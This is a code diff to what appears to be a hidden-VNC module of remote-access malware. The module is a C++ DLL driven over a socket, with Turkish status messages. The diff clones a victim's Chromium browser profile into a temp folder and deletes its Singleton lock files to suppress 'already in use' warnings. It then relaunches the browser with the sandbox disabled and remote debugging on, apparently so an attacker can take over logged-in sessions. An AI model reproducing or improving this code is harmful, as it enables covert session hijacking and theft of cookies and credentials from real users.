@@ -1290,15 +1290,17 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
 
                     wstring clonePath = tempBase + L"\\hvncp_" + bInfo.name + L"_" + to_wstring(GetTickCount());
 
-                    if (CopyDirectory(bInfo.userData, clonePath)) {
-                        send_status("'" + wstring_to_utf8(bInfo.name) + "' tarayıcı açılıyor...");
-                        // SHFileOperation copies "User Data" folder INTO clonePath, so we point to it
-                        wstring actualProfilePath = clonePath + L"\\User Data";
-                        cmdLineStr = L"\"" + bInfo.exe + L"\" --user-data-dir=\"" + actualProfilePath + L"\" --no-sandbox --disable-gpu";
-                    } else {
-                        send_status("Profil kopyalanamadı, varsayılan ile açılıyor...");
-                        cmdLineStr = L"\"" + bInfo.exe + L"\" --no-sandbox --disable-gpu";
-                    }
+                    // Use \* to copy contents, so clonePath becomes the User Data root
+                    CopyDirectory(bInfo.userData + L"\\*", clonePath);
+
+                    // Chromium check for lock files to prevent "Already in Use" dialogs
+                    DeleteFileW((clonePath + L"\\SingletonLock").c_str());
+                    DeleteFileW((clonePath + L"\\SingletonCookie").c_str());
+                    DeleteFileW((clonePath + L"\\SingletonSocket").c_str());
+
+                    send_status("'" + wstring_to_utf8(bInfo.name) + "' tarayıcı açılıyor...");
+                    cmdLineStr = L"\"" + bInfo.exe + L"\" --user-data-dir=\"" + clonePath +
+                                 L"\" --no-sandbox --disable-gpu --no-first-run --no-default-browser-check --remote-debugging-port=0";
                 } else {
                     cmdLineStr = path;
                 }
